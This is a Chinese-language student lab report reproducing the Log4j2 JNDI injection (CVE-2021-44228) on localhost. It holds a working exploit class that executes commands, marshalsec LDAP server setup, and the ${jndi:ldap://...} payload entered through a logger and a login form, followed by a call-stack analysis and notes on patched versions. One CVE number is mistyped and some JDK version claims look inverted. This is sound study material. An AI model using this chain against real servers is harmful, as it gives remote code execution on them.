---
counter: True
comment: True
---

# Apache Log4j2 漏洞触发

!!! abstract
    系统安全 lab1 实验报告，实验与网络空间安全导论课程报告选题重合，大部分参考 [log4j 漏洞复现](/sec/vulns/log4j/)

    !!! warning "仅供学习参考，请勿抄袭"

## 实验目标

- 理解 Apache Log4j2 漏洞的原理，掌握 Log4j2 漏洞的触发
- 加深对软件供应链安全的理解

## 实验过程

由于本人在大一春夏学期的网络空间安全导论课上选择了 log4j 漏洞复现与分析作为课程报告，所以本实验有很多参考了当时本人的报告内容。当时的报告可见：<https://note.tonycrane.cc/sec/vulns/log4j/>。

### Task 1：本地触发

首先构建 Exploit 脚本，只需要通过 java.lang.Runtime.getRuntime().exec(cmds).waitFor(); 执行任意命令即可，由于我是 macOS 环境，所以需要通过 open /System/Applications/Calculator.app 来打开计算器：

```java
public class Exploit {
    static {
        System.out.println("Executing exploit!");
        System.out.println("Attack!");
        try {
            String[] cmds = {"open", "/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

接下来在同一目录中通过 python -m http.server 8100 来开启一个 HTTP 服务，可以通过 curl -I 127.0.0.1:8100/Exploit.class 来验证是否可以访问到该文件。

然后需要在本地起一个 LDAP 服务，可以通过 marshalsec 项目来进行搭建：

```shell
git clone https://github.com/mbechler/marshalsec.git
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"
```

接下来完善服务程序，进行 log4j2 的 log：

```java
package com;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j {
    private static final Logger LOGGER = LogManager.getLogger(Log4j.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
```

然后在 Log4j2Vul/Log4j2Ldap 文件夹中构建并运行：

```shell
cd Log4j2Vul/Log4j2Ldap
mvn clean package
java -jar target/lab-0.0.1-SNAPSHOT.jar
```

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab1/img1.png" width="100%" style="margin: 0 auto;">
</div>

可以发现在运行的时候服务程序进行了 error 记录，在输出的时候访问了该 LDAP 服务，LDAP 服务将本次 python HTTP 服务的 Exploit.class 返回给服务器运行，从而触发了 Exploit.java 中的任意命令执行，打开了计算器实现了 RCE。具体流程后续思考题中分析。

### Task 2：项目中触发

先配置 mysql 环境，我使用 docker 来运行 mysql：

```shell
docker pull mysql:latest
docker run -it -d --name mysql_syssec -p 3306:3306 -e MYSQL_ROOT_PASSWORD=aaaaaa mysql
docker exec -it mysql_syssec bash
```

进入 docker 后通过 cat > /wj.sql 将 wj.sql 的内容拷贝到容器中，然后进入数据库：

```sql
bash-5.1# mysql -h localhost -u root -p
Enter password: aaaaaa
...
mysql> create DATABASE wj;
Query OK, 1 row affected (0.01 sec)

mysql> use wj;
Database changed
mysql> source /wj.sql
```

即可完成数据库的配置。

接下来修改 White-Jotter/src/main/resources/application.properties 中的数据库配置：

```properties
spring.datasource.url=jdbc:mysql://localhost:3306/wj?characterEncoding=UTF-8&serverTimezone=GMT%2B8
spring.datasource.username=root
spring.datasource.password=aaaaaa
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
```

接下来构建并运行项目：

```shell
cd White-Jotter
mvn clean package
cd target
java -jar wj-1.0.0.war
```

发现 localhost:8443/login 并不能正常访问，报错为找不到对应的 index.html。发现 resources 文件夹中内容不对，需要将 White-Jotter/public 文件夹拷贝到 src/main/resources 下，然后重新构建并运行项目，即可成功访问。输入 admin/123 可以正常登录。

接下来编写 Exploit 脚本，类似前面的打开计算器，这里需要开启 python HTTP 服务：

```java
public class Exploit {
    static {
        System.out.println("Executing exploit!");
        System.out.println("Attack!");
        try {
            String[] cmds = {"python", "-m", "http.server", "8888", "--directory", ".."};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

然后同样本地开启 HTTP 服务和 LDAP 服务：

```shell
python -m http.server 8100
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"
```

接下来在用户名处输入 ${jndi:ldap://127.0.0.1:1389/Exploit} 并登录，即可触发漏洞，在服务器上 RCE，开启 8888 端口上的服务。可以发现 LDAP 和 HTTP 服务中出现了请求，wj 服务中也执行了 Exploit.class 出现了输出：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab1/img2.png" width="100%" style="margin: 0 auto;">
</div>

同时可以通过 8888 端口来访问 web 服务的源文件：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab1/img3.png" width="60%" style="margin: 0 auto;">
</div>

## 思考题

> 1. **解释实验 1（本地弹计算器）的漏洞触发过程**

下面的分析来自本人在大一春夏“网络空间安全导论”课程报告 log4j 漏洞复现中的分析。

**JNDI 注入原理：**

JNDI 封装了一些服务，并且通过 lookup 来访问服务，例如通过 lookup("rmi://ip:port/...") 的形式访问 ip:port 提供的 RMI 服务，通过 lookup("ldap://ip:port/...") 的形式访问 LDAP 服务。

JNDI 的目的是通过名称/目录获取对象，而远程读取的一般是编译后的 .class 文件所以在 lookup 时会进行类加载，JVM 将其加载为 Java 类。而当 ClassLoader 加载 .class 文件的时候会调用类的 clinit 方法，执行类的静态代码。因此如果可以控制 JNDI lookup 的 URL，便可以任意加载远程类，执行恶意代码，这也就是 JNDI 注入原理。

但是 JNDI 注入受到 JDK 配置限制，如果 com.sun.jndi.xxx.object.trustURLCodebase 这一配置是 false 时则不会信任 URL 从而无法进行 JNDI 注入。在 JDK 11.0.1、8u191、7u201、6u211 等版本中这一配置默认是 true，而从 6u132、7u122、8u113 开始，这一配置默认为 false（因此后面使用高版本 JDK 复现时要手动开启这一配置）

**CVE-2021-44228 漏洞原理：**

CVE-2021-44228 即是通过 log4j 来实现了 JNDI 注入。log4j 可以通过 \${} 语法来获取动态内容并输出到日志中，其中对于每个 \${} 部分使用 lookup 方法来解决变量，其中也提供了 JndiLookup，也就是说可以使用 JNDI 来读取内容，形如 \${jndi:...}。这时就存在 JNDI 注入。

而大部分使用 log4j 来记录日志的网络应用都会记录用户的输入，比如搜索网站会记录用户搜索的内容，这时如果用户输入的是 \${jndi:...}（比如 ${jndi:ldap://ip:port/...}） 就会进行 JndiLookup，实现 JNDI 注入，这也就是 CVE-2021-44228 这个漏洞的原理。

**漏洞触发过程分析：**

通过调试运行 log4j 漏洞应用可以获取到整个程序的调用栈：

```java
<clinit>:11, Exploit
forName0:-1, Class (java.lang)
forName:348, Class (java.lang)
loadClass:91, VersionHelper12 (com.sun.naming.internal)
loadClass:101, VersionHelper12 (com.sun.naming.internal)
loadClass:115, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1114, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
log:481, LoggerConfig (org.apache.logging.log4j.core.config)
log:456, LoggerConfig (org.apache.logging.log4j.core.config)
log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
error:740, AbstractLogger (org.apache.logging.log4j.spi)
main:11, log4j
```
可以较清晰地分析出来程序进入执行 logger.error，然后在 log 中逐层调用最终调用到 resolveVariable 即处理 ${} 变量，然后调用到了 Interpolator 的 lookup 方法，其中寻找到了 JndiLookup 类，调用其 lookup 方法，从 LDAP 服务获取类，然后从中 getObjectInstance，这里会进行 loadClass 操作，而其中调用了 Exploit 类隐藏的 clinit 方法也就是静态代码，造成 RCE。

> 2. **如何防护 Apache Log4j2 漏洞**

下面的分析来自本人在大一春夏“网络空间安全导论”课程报告 log4j 漏洞复现中的分析。

高版本的 JDK 中设置了 com.sun.jndi.xxx.object.trustURLCodebase 默认为 false，这可以防止一部分 JNDI 注入的发生。

在 CVE-2021-42288 发布后，Apache 通过 #608 这个 pull request 来对 LDAP 进行了限制，并发布了 2.15.0-rc1 版本。但这个版本仍存在绕过方式，即通过构造出会抛出异常的 payload 就可以绕过检验。

随后 Apache 又进行了对于异常 URI 的处理，发布了 2.15.0-rc2 版本，但这个版本仍会通过较复杂的绕过实现 RCE。因此在 2.16.0-rc1 版本中，Message Lookups 被彻底删除，这个漏洞被触发的情况就更少了，但如果开发者手动开启 JNDI 功能，则仍有可能通过一系列绕过实现注入。

但是在 2.16.0 版本中如果没有开启 JNDI 功能，则双层嵌套的 \${\${...}} 会导致无限递归，从而造成 DoS 攻击，这也就是后续的 CVE-2021-45046 这个漏洞。随后在 2.17.0 版本中 Apache 修复了这个问题，并且限制即使开启了 JNDI 功能，其仅支持 java 协议而不支持 ldap，2.15.0-rc2 和 2.16.0 中的绕过也无效了。因此 2.17.0 也就成为了可以完全防止这一漏洞的 log4j 版本了。